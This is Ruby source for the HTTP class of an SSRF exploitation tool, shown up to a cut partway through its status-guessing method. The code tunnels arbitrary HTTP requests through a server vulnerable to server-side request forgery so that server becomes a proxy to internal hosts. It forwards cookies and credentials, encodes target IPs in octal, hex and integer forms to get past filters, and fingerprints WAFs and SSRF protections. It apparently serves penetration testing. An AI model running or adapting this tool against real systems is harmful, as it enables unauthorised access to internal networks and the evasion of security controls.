# coding: utf-8
#
# Copyright (c) 2015-2016 Brendan Coles <bcoles@gmail.com>
# SSRF Proxy - https://github.com/bcoles/ssrf_proxy
# See the file 'LICENSE.md' for copying permission
#

module SSRFProxy
  #
  # SSRFProxy::HTTP object takes information required to connect
  # to a HTTP server vulnerable to SSRF and issue arbitrary HTTP
  # requests via the SSRF.
  #
  # Once configured, the #send_uri method can be used to tunnel
  # HTTP requests through the server.
  #
  # Several request modification options can be used to format
  # the HTTP request appropriately for the SSRF vector and
  # the destination web server accessed via the SSRF.
  #
  # Several response modification options can be used to infer
  # information about the response from the destination server
  # and format the response such that the vulnerable intermediary
  # server is mostly transparent to the client initiating the
  # HTTP request.
  #
  # Refer to the wiki for more information about configuring the
  # SSRF, requestion modification, and response modification:
  # https://github.com/bcoles/ssrf_proxy/wiki/Configuration
  #
  class HTTP
    attr_reader :logger, :proxy

    #
    # SSRFProxy::HTTP errors
    #
    module Error
      # SSRFProxy::HTTP custom errors
      class Error < StandardError; end
      exceptions = %w(NoUrlPlaceholder
                      InvalidSsrfRequest
                      InvalidSsrfRequestMethod
                      InvalidUpstreamProxy
                      InvalidIpEncoding
                      InvalidClientRequest
                      ConnectionTimeout)
      exceptions.each { |e| const_set(e, Class.new(Error)) }
    end

    #
    # SSRFProxy::HTTP accepts SSRF connection information,
    # and configuration options for request modificaiton
    # and response modification.
    #
    # @param [String] url SSRF URL with 'xxURLxx' placeholder
    # @param [Hash] opts SSRF and HTTP connection options:
    # @option opts [String] proxy
    # @option opts [String] method
    # @option opts [String] post_data
    # @option opts [String] rules
    # @option opts [String] ip_encoding
    # @option opts [Regex] match
    # @option opts [String] strip
    # @option opts [Boolean] decode_html
    # @option opts [Boolean] unescape
    # @option opts [Boolean] guess_status
    # @option opts [Boolean] guess_mime
    # @option opts [Boolean] timeout_ok
    # @option opts [Boolean] ask_password
    # @option opts [Boolean] forward_method
    # @option opts [Boolean] forward_headers
    # @option opts [Boolean] forward_body
    # @option opts [Boolean] forward_cookies
    # @option opts [Boolean] body_to_uri
    # @option opts [Boolean] auth_to_uri
    # @option opts [Boolean] cookies_to_uri
    # @option opts [String] cookie
    # @option opts [Integer] timeout
    # @option opts [String] user_agent
    # @option opts [Boolean] insecure
    #
    # @example SSRF with default options
    #   SSRFProxy::HTTP.new('http://example.local/index.php?url=xxURLxx')
    #
    # @raise [SSRFProxy::HTTP::Error::InvalidSsrfRequest]
    #        Invalid SSRF request specified.
    #
    def initialize(url = '', opts = {})
      @detect_waf = true
      @logger = ::Logger.new(STDOUT).tap do |log|
        log.progname = 'ssrf-proxy'
        log.level = ::Logger::WARN
        log.datetime_format = '%Y-%m-%d %H:%M:%S '
      end
      begin
        @ssrf_url = URI.parse(url.to_s)
      rescue URI::InvalidURIError
        raise SSRFProxy::HTTP::Error::InvalidSsrfRequest.new,
              'Invalid SSRF request specified.'
      end
      if @ssrf_url.scheme.nil? || @ssrf_url.host.nil? || @ssrf_url.port.nil?
        raise SSRFProxy::HTTP::Error::InvalidSsrfRequest.new,
              'Invalid SSRF request specified.'
      end
      if @ssrf_url.scheme !~ /\Ahttps?\z/
        raise SSRFProxy::HTTP::Error::InvalidSsrfRequest.new,
              'Invalid SSRF request specified. Scheme must be http(s).'
      end
      parse_options(opts)
    end

    #
    # Parse initialization configuration options
    #
    # @param [Hash] opts Options for SSRF and HTTP connection options
    #
    # @raise [SSRFProxy::HTTP::Error::InvalidUpstreamProxy]
    #        Invalid upstream proxy specified.
    # @raise [SSRFProxy::HTTP::Error::InvalidSsrfRequestMethod]
    #        Invalid SSRF request method specified.
    #        Method must be GET/HEAD/DELETE/POST/PUT/OPTIONS.
    # @raise [SSRFProxy::HTTP::Error::NoUrlPlaceholder]
    #        'xxURLxx' URL placeholder must be specified in the
    #         SSRF request URL or body.
    # @raise [SSRFProxy::HTTP::Error::InvalidIpEncoding]
    #        Invalid IP encoding method specified.
    #
    def parse_options(opts = {})
      # SSRF configuration options
      @proxy = nil
      @method = 'GET'
      @post_data = ''
      @rules = []
      opts.each do |option, value|
        next if value.eql?('')
        case option
        when 'proxy'
          begin
            @proxy = URI.parse(value)
          rescue URI::InvalidURIError
            raise SSRFProxy::HTTP::Error::InvalidUpstreamProxy.new,
                  'Invalid upstream proxy specified.'
          end
          if @proxy.host.nil? || @proxy.port.nil?
            raise SSRFProxy::HTTP::Error::InvalidUpstreamProxy.new,
                  'Invalid upstream proxy specified.'
          end
          if @proxy.scheme !~ /\A(socks|https?)\z/
            raise SSRFProxy::HTTP::Error::InvalidUpstreamProxy.new,
                  'Unsupported upstream proxy specified. ' \
                  'Scheme must be http(s) or socks.'
          end
        when 'method'
          case value.to_s.downcase
          when 'get'
            @method = 'GET'
          when 'head'
            @method = 'HEAD'
          when 'delete'
            @method = 'DELETE'
          when 'post'
            @method = 'POST'
          when 'put'
            @method = 'PUT'
          when 'options'
            @method = 'OPTIONS'
          else
            raise SSRFProxy::HTTP::Error::InvalidSsrfRequestMethod.new,
                  'Invalid SSRF request method specified. ' \
                  'Method must be GET/HEAD/DELETE/POST/PUT/OPTIONS.'
          end
        when 'post_data'
          @post_data = value.to_s
        when 'rules'
          @rules = value.to_s.split(/,/)
        end
      end
      if @ssrf_url.request_uri !~ /xxURLxx/ && @post_data.to_s !~ /xxURLxx/
        raise SSRFProxy::HTTP::Error::NoUrlPlaceholder.new,
              'You must specify a URL placeholder with ' \
              "'xxURLxx' in the SSRF request"
      end

      # client request modification
      @ip_encoding = nil
      @forward_method = false
      @forward_headers = false
      @forward_body = false
      @forward_cookies = false
      @body_to_uri = false
      @auth_to_uri = false
      @cookies_to_uri = false
      opts.each do |option, value|
        next if value.eql?('')
        case option
        when 'ip_encoding'
          if value.to_s !~ /\A[a-z0-9_]+\z/i
            raise SSRFProxy::HTTP::Error::InvalidIpEncoding.new,
                  'Invalid IP encoding method specified.'
          end
          @ip_encoding = value.to_s
        when 'forward_method'
          @forward_method = true if value
        when 'forward_headers'
          @forward_headers = true if value
        when 'forward_body'
          @forward_body = true if value
        when 'forward_cookies'
          @forward_cookies = true if value
        when 'body_to_uri'
          @body_to_uri = true if value
        when 'auth_to_uri'
          @auth_to_uri = true if value
        when 'cookies_to_uri'
          @cookies_to_uri = true if value
        end
      end

      # SSRF connection options
      @cookie = nil
      @timeout = 10
      @user_agent = 'Mozilla/5.0'
      @insecure = false
      opts.each do |option, value|
        next if value.eql?('')
        case option
        when 'cookie'
          @cookie = value.to_s
        when 'timeout'
          @timeout = value.to_i
        when 'user_agent'
          @user_agent = value.to_s
        when 'insecure'
          @insecure = true if value
        end
      end

      # HTTP response modification options
      @match_regex = '\\A(.*)\\z'
      @strip = []
      @decode_html = false
      @unescape = false
      @guess_status = false
      @guess_mime = false
      @timeout_ok = false
      @ask_password = false
      opts.each do |option, value|
        next if value.eql?('')
        case option
        when 'match'
          @match_regex = value.to_s
        when 'strip'
          @strip = value.to_s.split(/,/)
        when 'decode_html'
          @decode_html = true if value
        when 'unescape'
          @unescape = true if value
        when 'guess_status'
          @guess_status = true if value
        when 'guess_mime'
          @guess_mime = true if value
        when 'timeout_ok'
          @timeout_ok = true if value
        when 'ask_password'
          @ask_password = true if value
        end
      end
    end

    #
    # URL accessor
    #
    # @return [String] SSRF URL
    #
    def url
      @ssrf_url
    end

    #
    # Scheme accessor
    #
    # @return [String] SSRF scheme
    #
    def scheme
      @ssrf_url.scheme
    end

    #
    # Host accessor
    #
    # @return [String] SSRF host
    #
    def host
      @ssrf_url.host
    end

    #
    # Port accessor
    #
    # @return [String] SSRF host port
    #
    def port
      @ssrf_url.port
    end

    #
    # Parse a HTTP request as a string, then send the requested URL
    # and HTTP headers to send_uri
    #
    # @param [String] request raw HTTP request
    #
    # @raise [SSRFProxy::HTTP::Error::InvalidClientRequest]
    #        An invalid client HTTP request was supplied.
    #
    # @return [Hash] HTTP response hash (version, code, message, headers, body)
    #
    def send_request(request)
      # parse method
      if request.to_s !~ /\A(GET|HEAD|DELETE|POST|PUT|OPTIONS) /
        logger.warn('Client request method is not supported')
        raise SSRFProxy::HTTP::Error::InvalidClientRequest,
              'Client request method is not supported'
      end

      # validate host
      if request.to_s !~ %r{\A(GET|HEAD|DELETE|POST|PUT|OPTIONS) https?://}
        if request.to_s =~ /^Host: ([^\s]+)\r?\n/
          logger.info("Using host header: #{$1}")
        else
          logger.warn('No host specified')
          raise SSRFProxy::HTTP::Error::InvalidClientRequest,
                'No host specified'
        end
      end

      # parse client request
      begin
        req = WEBrick::HTTPRequest.new(WEBrick::Config::HTTP)
        req.parse(StringIO.new(request))
      rescue
        logger.info('Received malformed client HTTP request.')
        raise SSRFProxy::HTTP::Error::InvalidClientRequest,
              'Received malformed client HTTP request.'
      end

      # send request
      send_uri(req.request_uri, req.request_method, req.header, req.body)
    end

    #
    # Fetch a URI via SSRF
    #
    # @param [String] uri URI to fetch
    # @param [String] method request method
    # @param [Hash] headers HTTP request headers
    # @param [String] body request body
    #
    # @raise [SSRFProxy::HTTP::Error::InvalidClientRequest]
    #        An invalid client HTTP request was supplied.
    #
    # @return [Hash] HTTP response hash (version, code, message, headers, body, etc)
    #
    def send_uri(uri, method = 'GET', headers = {}, body = '')
      uri = uri.to_s

      # validate url
      if uri !~ %r{^https?:\/\/.}
        raise SSRFProxy::HTTP::Error::InvalidClientRequest,
              'Invalid request URI'
      end

      # set request method
      if @forward_method
        if method =~ /\A(GET|HEAD|DELETE|POST|PUT|OPTIONS)\z/
          request_method = method
        else
          raise SSRFProxy::HTTP::Error::InvalidClientRequest,
                "Request method '#{method}' is not supported"
        end
      else
        request_method = @method
      end

      # set request headers, using first instance of each HTTP header
      # Duplicate HTTP headers are not allowed by Net::HTTP
      new_headers = {}
      headers.each do |k, v|
        if v.is_a?(Array)
          new_headers[k.downcase] = v.flatten.first
        elsif v.is_a?(String)
          new_headers[k.downcase] = v.to_s
        else
          raise SSRFProxy::HTTP::Error::InvalidClientRequest,
                "Request header #{k} value is malformed: #{v}"
        end
      end

      # reject websocket requests
      if new_headers['upgrade'] =~ /^WebSocket/
        logger.warn('WebSocket tunneling is not supported')
        raise SSRFProxy::HTTP::Error::InvalidClientRequest,
              'WebSocket tunneling is not supported'
      end

      # copy request body to uri
      if @body_to_uri && !body.nil?
        logger.debug("Parsing request body: #{body}")
        separator = uri =~ /\?/ ? '&' : '?'
        uri = "#{uri}#{separator}#{body}"
        logger.info("Added request body to URI: #{body}")
      end

      # copy basic authentication credentials to uri
      if @auth_to_uri && new_headers['authorization'] =~ /^basic /i
        logger.debug("Parsing basic authentication header: #{new_headers['authorization']}")
        begin
          creds = new_headers['authorization'].split(' ')[1]
          user = Base64.decode64(creds).chomp
          uri = uri.gsub!(%r{:(//)}, "://#{user}@")
          logger.info("Using basic authentication credentials: #{user}")
        rescue
          logger.warn('Could not parse request authorization header: ' \
                      "#{new_headers['authorization']}")
        end
      end

      # copy cookies to uri
      cookies = []
      if @cookies_to_uri && !new_headers['cookie'].nil?
        logger.debug("Parsing request cookies: #{new_headers['cookie']}")
        new_headers['cookie'].split(/;\s*/).each do |c|
          cookies << c.to_s unless c.nil?
        end
        separator = uri =~ /\?/ ? '&' : '?'
        uri = "#{uri}#{separator}#{cookies.join('&')}"
        logger.info("Added cookies to URI: #{cookies.join('&')}")
      end

      request_headers = {}

      # forward request cookies
      new_cookie = []
      new_cookie << @cookie unless @cookie.nil?
      if @forward_cookies && !new_headers['cookie'].nil?
        new_headers['cookie'].split(/;\s*/).each do |c|
          new_cookie << c.to_s unless c.nil?
        end
      end
      unless new_cookie.empty?
        new_headers['cookie'] = new_cookie.uniq.join('; ')
        request_headers['cookie'] = new_cookie.uniq.join('; ')
        logger.info("Using cookie: #{new_headers['cookie']}")
      end

      # forward request headers and strip proxy headers
      if @forward_headers && !new_headers.empty?
        new_headers.each do |k, v|
          next if k.eql?('proxy-connection')
          next if k.eql?('proxy-authorization')
          request_headers[k] = v.to_s
        end
      end

      # set user agent
      if request_headers['user-agent'].nil?
        request_headers['user-agent'] = @user_agent unless @user_agent.eql?('')
      end

      # encode target host ip
      encoded_uri = @ip_encoding ? encode_ip(uri, @ip_encoding) : uri

      # run request URI through rules and replace xxURLxx placeholder
      target_uri = run_rules(encoded_uri, @rules)
      ssrf_url = "#{@ssrf_url.path}?#{@ssrf_url.query}".gsub(/xxURLxx/, target_uri.to_s)

      # set request body and replace xxURLxx placeholder
      post_data = @post_data.gsub(/xxURLxx/, target_uri.to_s)
      request_body = @forward_body && !body.eql?('') ? "#{post_data}&#{body}" : post_data

      # set content type
      if request_headers['content-type'].nil? && !request_body.eql?('')
        request_headers['content-type'] = 'application/x-www-form-urlencoded'
      end

      # send request
      response = nil
      start_time = Time.now
      begin
        response = send_http_request(ssrf_url,
                                     request_method,
                                     request_headers,
                                     request_body)
        result = { 'url'          => uri,
                   'http_version' => response.http_version,
                   'code'         => response.code,
                   'message'      => response.message,
                   'headers'      => '',
                   'body'         => response.body.to_s || '' }
      rescue SSRFProxy::HTTP::Error::ConnectionTimeout => e
        unless @timeout_ok
          raise SSRFProxy::HTTP::Error::ConnectionTimeout, e.message
        end
        result = { 'url'          => uri,
                   'http_version' => '1.0',
                   'code'         => 200,
                   'message'      => 'Timeout',
                   'headers'      => '',
                   'body'         => '' }
        logger.info('Changed HTTP status code 504 to 200')
      end

      # set duration
      end_time = Time.now
      duration = ((end_time - start_time) * 1000).round(3)
      result['duration'] = duration
      logger.info("Received #{result['body'].length} bytes in #{duration} ms")

      # match response content
      unless @match_regex.nil?
        matches = result['body'].scan(/#{@match_regex}/m)
        if !matches.empty?
          result['body'] = matches.flatten.first.to_s
          logger.info("Response body matches pattern '#{@match_regex}'")
        else
          result['body'] = ''
          logger.warn("Response body does not match pattern '#{@match_regex}'")
        end
      end

      # unescape response body
      if @unescape
        # unescape slashes
        result['body'] = result['body'].tr('\\', '\\')
        result['body'] = result['body'].gsub('\\/', '/')
        # unescape whitespace
        result['body'] = result['body'].gsub('\r', "\r")
        result['body'] = result['body'].gsub('\n', "\n")
        result['body'] = result['body'].gsub('\t', "\t")
        # unescape quotes
        result['body'] = result['body'].gsub('\"', '"')
        result['body'] = result['body'].gsub("\\'", "'")
      end

      # decode HTML entities
      if @decode_html
        result['body'] = HTMLEntities.new.decode(
          result['body'].encode(
            'UTF-8',
            :invalid => :replace,
            :undef   => :replace,
            :replace => '?'
          )
        )
      end

      # set title
      result['title'] = result['body'][0..8192] =~ %r{<title>([^<]*)</title>}im ? $1.to_s : ''

      # guess HTTP response code and message
      if @guess_status
        head = result['body'][0..8192]
        status = guess_status(head)
        unless status.empty?
          result['code'] = status['code']
          result['message'] = status['message']
          logger.info("Using HTTP response status: #{result['code']} #{result['message']}")
        end
      end

      # replace timeout response with 200 OK
      if @timeout_ok
        if result['code'].eql?('504')
          logger.info('Changed HTTP status code 504 to 200')
          result['code'] = 200
        end
      end

      # set status line
      result['status_line'] = "HTTP/#{result['http_version']} #{result['code']} #{result['message']}"

      # strip unwanted HTTP response headers
      unless response.nil?
        response.each_header do |header_name, header_value|
          if @strip.include?(header_name.downcase)
            logger.info("Removed response header: #{header_name}")
            next
          end
          result['headers'] << "#{header_name}: #{header_value}\n"
        end
      end

      # advise client to close HTTP connection
      if result['headers'] =~ /^connection:.*$/i
        result['headers'].gsub!(/^connection:.*$/i, 'Connection: close')
      else
        result['headers'] << "Connection: close\n"
      end

      # guess mime type and add content-type header
      if @guess_mime
        content_type = guess_mime(File.extname(uri.to_s.split('?').first))
        unless content_type.nil?
          logger.info("Using content-type: #{content_type}")
          if result['headers'] =~ /^content\-type:.*$/i
            result['headers'].gsub!(/^content\-type:.*$/i,
                                    "Content-Type: #{content_type}")
          else
            result['headers'] << "Content-Type: #{content_type}\n"
          end
        end
      end

      # prompt for password
      if @ask_password
        if result['code'].to_s.eql?('401')
          auth_uri = URI.parse(uri.to_s.split('?').first)
          realm = "#{auth_uri.host}:#{auth_uri.port}"
          result['headers'] << "WWW-Authenticate: Basic realm=\"#{realm}\"\n"
          logger.info("Added WWW-Authenticate header for realm: #{realm}")
        end
      end

      # set content length
      content_length = result['body'].length
      if result['headers'] =~ /^transfer\-encoding:.*$/i
        result['headers'].gsub!(/^transfer\-encoding:.*$/i,
                                "Content-Length: #{content_length}")
      elsif result['headers'] =~ /^content\-length:.*$/i
        result['headers'].gsub!(/^content\-length:.*$/i,
                                "Content-Length: #{content_length}")
      else
        result['headers'] << "Content-Length: #{content_length}\n"
      end

      # detect WAF and SSRF protection libraries
      if @detect_waf
        head = result['body'][0..8192]
        waf = nil
        if head =~ /fin1te\\SafeCurl\\Exception\\InvalidURLException/
          waf = 'SafeCurl'
        elsif result['code'].to_s.eql?('999')
          waf = 'WebKnight'
        elsif result['headers'] =~ /^[Ss]erver: ([Mm]od_[Ss]ecurity|NOYB)/
          waf = 'mod_security'
        elsif result['headers'] =~ /^[Ss]erver: Safedog/
          waf = 'Safedog'
        elsif result['headers'] =~ /^[Ss]erver: BinarySec/
          waf = 'BinarySec'
        elsif result['headers'] =~ /^[Ss]erver: NSFocus/
          waf = 'NSFocus'
        end
        logger.info("#{waf} appears to be in use") unless waf.nil?
      end

      # return HTTP response
      logger.debug("Response:\n" \
                   "#{result['status_line']}\n" \
                   "#{result['headers']}\n" \
                   "#{result['body']}")
      result
    end

    #
    # Encode IP address of a given URL
    #
    # @param [String] url target URL
    # @param [String] mode encoding (int, ipv6, oct, hex, dotted_hex)
    #
    # @return [String] encoded IP address
    #
    def encode_ip(url, mode)
      return if url.nil?
      new_host = nil
      host = URI.parse(url.to_s.split('?').first).host.to_s
      begin
        ip = IPAddress::IPv4.new(host)
      rescue
        logger.warn("Could not parse requested host as IPv4 address: #{host}")
        return url
      end
      case mode
      when 'int'
        new_host = url.to_s.gsub(host, ip.to_u32.to_s)
      when 'ipv6'
        new_host = url.to_s.gsub(host, "[#{ip.to_ipv6}]")
      when 'oct'
        new_host = url.to_s.gsub(host, "0#{ip.to_u32.to_s(8)}")
      when 'hex'
        new_host = url.to_s.gsub(host, "0x#{ip.to_u32.to_s(16)}")
      when 'dotted_hex'
        res = ip.octets.map { |i| "0x#{i.to_s(16).rjust(2, '0')}" }.join('.')
        new_host = url.to_s.gsub(host, res.to_s) unless res.nil?
      else
        logger.warn("Invalid IP encoding: #{mode}")
      end
      new_host
    end

    #
    # Run a specified URL through SSRF rules
    #
    # @param [String] url request URL
    # @param [String] rules comma separated list of rules
    #
    # @return [String] modified request URL
    #
    def run_rules(url, rules)
      str = url.to_s
      return str if rules.nil?
      rules.each do |rule|
        case rule
        when 'noproto'
          str = str.gsub(%r{^https?://}, '')
        when 'nossl', 'http'
          str = str.gsub(%r{^https://}, 'http://')
        when 'ssl', 'https'
          str = str.gsub(%r{^http://}, 'https://')
        when 'base32'
          str = Base32.encode(str).to_s
        when 'base64'
          str = Base64.encode64(str).delete("\n")
        when 'md4'
          str = OpenSSL::Digest::MD4.hexdigest(str)
        when 'md5'
          md5 = Digest::MD5.new
          md5.update str
          str = md5.hexdigest
        when 'sha1'
          str = Digest::SHA1.hexdigest(str)
        when 'reverse'
          str = str.reverse
        when 'upcase'
          str = str.upcase
        when 'downcase'
          str = str.downcase
        when 'rot13'
          str = str.tr('A-Za-z', 'N-ZA-Mn-za-m')
        when 'urlencode'
          str = CGI.escape(str)
        when 'urldecode'
          str = CGI.unescape(str)
        when 'method_get'
          separator = str =~ /\?/ ? '&' : '?'
          str = "#{str}#{separator}method=get&_method=get"
        else
          logger.warn("Unknown rule: #{rule}")
        end
      end
      str
    end

    #
    # Send HTTP request to the SSRF server
    #
    # @param [String] url URI to fetch
    # @param [String] method HTTP request method
    # @param [Hash] headers HTTP request headers
    # @param [String] body HTTP request body
    #
    # @raise [SSRFProxy::HTTP::Error::InvalidSsrfRequestMethod]
    #        Invalid SSRF request method specified.
    #        Method must be GET/HEAD/DELETE/POST/PUT/OPTIONS.
    # @raise [SSRFProxy::HTTP::Error::ConnectionTimeout]
    #        The request to the remote host timed out.
    # @raise [SSRFProxy::HTTP::Error::InvalidUpstreamProxy]
    #        Invalid upstream proxy specified.
    #
    # @return [Hash] Hash of the HTTP response (status, code, headers, body)
    #
    def send_http_request(url, method, headers, body)
      # use upstream proxy
      if @proxy.nil?
        http = Net::HTTP::Proxy(nil).new(
          @ssrf_url.host,
          @ssrf_url.port
        )
      elsif @proxy.scheme =~ /\Ahttps?\z/
        http = Net::HTTP::Proxy(
          @proxy.host,
          @proxy.port
        ).new(
          @ssrf_url.host,
          @ssrf_url.port
        )
      elsif @proxy.scheme =~ /\Asocks\z/
        http = Net::HTTP.SOCKSProxy(
          @proxy.host,
          @proxy.port
        ).new(
          @ssrf_url.host,
          @ssrf_url.port
        )
      else
        raise SSRFProxy::HTTP::Error::InvalidUpstreamProxy.new,
              'Unsupported upstream proxy specified. Scheme must be http(s) or socks.'
      end

      # set SSL
      if @ssrf_url.scheme.eql?('https')
        http.use_ssl = true
        http.verify_mode = @insecure ? OpenSSL::SSL::VERIFY_NONE : OpenSSL::SSL::VERIFY_PEER
      end

      # set socket options
      http.open_timeout = @timeout
      http.read_timeout = @timeout

      # parse method
      case method
      when 'GET'
        request = Net::HTTP::Get.new(url, headers.to_hash)
      when 'HEAD'
        request = Net::HTTP::Head.new(url, headers.to_hash)
      when 'DELETE'
        request = Net::HTTP::Delete.new(url, headers.to_hash)
      when 'POST'
        request = Net::HTTP::Post.new(url, headers.to_hash)
      when 'PUT'
        request = Net::HTTP::Put.new(url, headers.to_hash)
      when 'OPTIONS'
        request = Net::HTTP::Options.new(url, headers.to_hash)
      else
        logger.info("SSRF request method not implemented -- Method[#{method}]")
        raise SSRFProxy::HTTP::Error::InvalidClientRequest,
              "Request method not implemented -- Method[#{method}]"
      end

      # send http request
      response = {}
      logger.info('Sending request: ' \
                  "#{@ssrf_url.scheme}://#{@ssrf_url.host}:#{@ssrf_url.port}#{url}")
      begin
        request.body = body unless body.eql?('')
        response = http.request(request)
      rescue Timeout::Error, Errno::ETIMEDOUT
        logger.info("Connection timed out [#{@timeout}]")
        raise SSRFProxy::HTTP::Error::ConnectionTimeout,
              "Connection timed out [#{@timeout}]"
      rescue => e
        logger.error("Unhandled exception: #{e}")
        raise e
      end
      response
    end

    #
    # Guess HTTP response status code and message based
    # on common strings in the response body such
    # as a default title or exception error message
    #
    # @param [String] response HTTP response
    #
    # @return [Hash] includes HTTP response code and message
    #
    def guess_status(response)
      result = {}
      # response status code returned by php-simple-proxy and php-json-proxy
      if response =~ /"status":{"http_code":([\d]+)}/
        result['code'] = $1
        result['message'] = ''
      # generic page titles containing HTTP status
      elsif response =~ />Document Moved</ || response =~ />Object Moved</
        result['code'] = 301
        result['message'] = 'Document Moved'
      elsif response =~ />302 Found</
        result['code'] = 302
        result['message'] = 'Found'
      elsif response =~ />400 Bad Request</
        result['code'] = 400
        result['message'] = 'Bad Request'
      elsif response =~ />401 Unauthorized</
        result['code'] = 401
        result['message'] = 'Unauthorized'
      elsif response =~ />403 Forbidden</
        result['code'] = 403
        result['message'] = 'Forbidden'
      elsif response =~ />404 Not Found</
        result['code'] = 404
        result['message'] = 'Not Found'
      elsif response =~ />The page is not found</
        result['code'] = 404
        result['message'] = 'Not Found'
      elsif response =~ />413 Request Entity Too Large</
        result['code'] = 413
        result['message'] = 'Request Entity Too Large'
      elsif response =~ />500 Internal Server Error</
        result['code'] = 500
        result['message'] = 'Internal Server Error'
      elsif response =~ />503 Service Unavailable</
        result['code'] = 503
        result['message'] = 'Service Unavailable'
      # getaddrinfo() errors
      elsif response =~ /getaddrinfo: /
        if response =~ /getaddrinfo: nodename nor servname provided/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        elsif response =~ /getaddrinfo: Name or service not known/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        end
      # getnameinfo() errors
      elsif response =~ /getnameinfo failed: /
        result['code'] = 502
        result['message'] = 'Bad Gateway'
      # PHP 'failed to open stream' errors
      elsif response =~ /failed to open stream: /
        # HTTP request failed! HTTP/[version] [code] [message]
        if response =~ %r{failed to open stream: HTTP request failed! HTTP\/(0\.9|1\.0|1\.1) ([\d]+) }
          result['code'] = $2.to_s
          result['message'] = ''
          if response =~ %r{failed to open stream: HTTP request failed! HTTP/(0\.9|1\.0|1\.1) [\d]+ ([a-zA-Z ]+)}
            result['message'] = $2.to_s
          end
        # No route to host
        elsif response =~ /failed to open stream: No route to host in/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        # Connection refused
        elsif response =~ /failed to open stream: Connection refused in/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        # Connection timed out
        elsif response =~ /failed to open stream: Connection timed out/
          result['code'] = 504
          result['message'] = 'Timeout'
        # Success - This likely indicates an SSL/TLS connection failure
        elsif response =~ /failed to open stream: Success in/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        end
      # Java 'java.net' exceptions
      elsif response =~ /java\.net\.[^\s]*Exception: /
        if response =~ /java\.net\.ConnectException: No route to host/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        elsif response =~ /java\.net\.ConnectException: Connection refused/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        elsif response =~ /java\.net\.ConnectException: Connection timed out/
          result['code'] = 504
          result['message'] = 'Timeout'
        elsif response =~ /java\.net\.UnknownHostException: Invalid hostname/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        elsif response =~ /java\.net\.SocketException: Network is unreachable/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        elsif response =~ /java\.net\.SocketException: Connection reset/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        elsif response =~ /java\.net\.SocketTimeoutException: Connection timed out/
          result['code'] = 504
          result['message'] = 'Timeout'
        end
      # C errno
      elsif response =~ /\[Errno -?[\d]{1,5}\]/
        if response =~ /\[Errno -2\] Name or service not known/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        elsif response =~ /\[Errno 101\] Network is unreachable/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        elsif response =~ /\[Errno 104\] Connection reset by peer/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        elsif response =~ /\[Errno 110\] Connection timed out/
          result['code'] = 504
          result['message'] = 'Timeout'
        elsif response =~ /\[Errno 111\] Connection refused/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        elsif response =~ /\[Errno 113\] No route to host/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        elsif response =~ /\[Errno 11004\] getaddrinfo failed/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        elsif response =~ /\[Errno 10053\] An established connection was aborted/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        elsif response =~ /\[Errno 10054\] An existing connection was forcibly closed/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        elsif response =~ /\[Errno 10055\] An operation on a socket could not be performed/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        elsif response =~ /\[Errno 10060\] A connection attempt failed/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        elsif response =~ /\[Errno 10061\] No connection could be made/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        end
      # Python urllib errors
      elsif response =~ /HTTPError: HTTP Error \d+/
        if response =~ /HTTPError: HTTP Error 400: Bad Request/
          result['code'] = 400
          result['message'] = 'Bad Request'
        elsif response =~ /HTTPError: HTTP Error 401: Unauthorized/
          result['code'] = 401
          result['message'] = 'Unauthorized'
        elsif response =~ /HTTPError: HTTP Error 402: Payment Required/
          result['code'] = 402
          result['message'] = 'Payment Required'
        elsif response =~ /HTTPError: HTTP Error 403: Forbidden/
          result['code'] = 403
          result['message'] = 'Forbidden'
        elsif response =~ /HTTPError: HTTP Error 404: Not Found/
          result['code'] = 404
          result['message'] = 'Not Found'
        elsif response =~ /HTTPError: HTTP Error 405: Method Not Allowed/
          result['code'] = 405
          result['message'] = 'Method Not Allowed'
        elsif response =~ /HTTPError: HTTP Error 410: Gone/
          result['code'] = 410
          result['message'] = 'Gone'
        elsif response =~ /HTTPError: HTTP Error 500: Internal Server Error/
          result['code'] = 500
          result['message'] = 'Internal Server Error'
        elsif response =~ /HTTPError: HTTP Error 502: Bad Gateway/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        elsif response =~ /HTTPError: HTTP Error 503: Service Unavailable/
          result['code'] = 503
          result['message'] = 'Service Unavailable'
        elsif response =~ /HTTPError: HTTP Error 504: Gateway Time-?out/
          result['code'] = 504
          result['message'] = 'Timeout'
        end
      # Ruby exceptions
      elsif response =~ /Errno::[A-Z]+/
        # Connection refused
        if response =~ /Errno::ECONNREFUSED/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        # No route to host
        elsif response =~ /Errno::EHOSTUNREACH/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        # Connection timed out
        elsif response =~ /Errno::ETIMEDOUT/
          result['code'] = 504
          result['message'] = 'Timeout'
        end
      # ASP.NET System.Net.WebClient errors
      elsif response =~ /System\.Net\.WebClient/
        # The remote server returned an error: ([code]) [message].
        if response =~ /WebException: The remote server returned an error: \(([\d+])\) /
          result['code'] = $1.to_s
          result['message'] = ''
          if response =~ /WebException: The remote server returned an error: \(([\d+])\) ([a-zA-Z ]+)\./
            result['message'] = $2.to_s
          end
        # Could not resolve hostname
        elsif response =~ /WebException: The remote name could not be resolved/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        # Remote server denied connection (port closed)
        elsif response =~ /WebException: Unable to connect to the remote server/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        # This likely indicates a plain-text connection to a HTTPS or non-HTTP service
        elsif response =~ /WebException: The underlying connection was closed: An unexpected error occurred on a receive/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
